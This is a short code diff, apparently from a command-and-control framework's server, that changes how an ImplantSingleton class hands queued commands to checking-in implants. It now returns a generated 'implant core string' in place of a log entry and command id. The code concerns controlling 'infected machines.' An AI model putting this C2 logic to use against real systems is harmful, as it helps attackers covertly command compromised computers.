@@ -27,7 +27,7 @@ class ImplantSingleton:
                 # BUG: If the X-Header is mangled this errors.
                 ImplantObj = db.implant.Get_GeneratedImplantDataFromUIK(UIK)
                 if ImplantObj is None:
-                    return None, None
+                    return None
                 db.implant.Update_ImplantLastCheckIn(ImplantObj['cid'], UIK, c2_protocol)
 
                 for implant in ImplantObj:
@@ -37,16 +37,19 @@ class ImplantSingleton:
                         if x.read_by_implant == 0:
                             tmpImpLogs.append(x)
                     if len(tmpImpLogs) != 0:
+                        # Get the lowest value (unix epoch where [registered] time is not 0
                         Entry = min(tmpImpLogs, key=lambda x: x.time)
+                        # Use the Entry data to generate the implant core string
+                        implant_core_string = self.ImpFunc.create_module_data_string(Entry)
                         if db.implant.Register_ImplantCommandPickup(Entry, c2_protocol):
-                            return Entry.log_entry, Entry.command_id
+                            return implant_core_string
 
             # -- Create a suitable null response.
             # --    This may be a random value, depending on how the implant handles it.
 
-                return None, None
+                return None
             else:
-                return None, None
+                return None
 
         # -- Used by Implant - Logs command responses from infected machines.
         def command_response(self, command_id, raw_command_result, c2_protocol=None):
